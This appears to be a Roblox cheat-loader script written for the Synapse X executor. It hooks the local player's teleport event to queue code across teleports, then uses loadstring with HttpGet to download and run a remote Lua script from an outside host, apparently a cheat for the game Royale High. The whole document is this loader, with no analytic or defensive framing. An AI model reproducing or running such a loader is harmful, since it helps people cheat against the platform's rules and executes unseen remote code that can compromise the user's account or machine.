game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        syn.queue_on_teleport("print('temporary')")
    end
end)
wait(1)
loadstring(game:HttpGet('https://painexist.gg/api/royalehigh.lua', true))()
